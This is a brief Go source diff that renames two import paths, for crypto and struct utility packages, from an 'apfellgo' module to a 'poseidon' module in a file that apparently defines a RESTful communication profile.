@@ -15,8 +15,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/xorrior/apfellgo/pkg/utils/crypto"
-	"github.com/xorrior/apfellgo/pkg/utils/structs"
+	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
 // Static vars for the Restful patchthrough profile
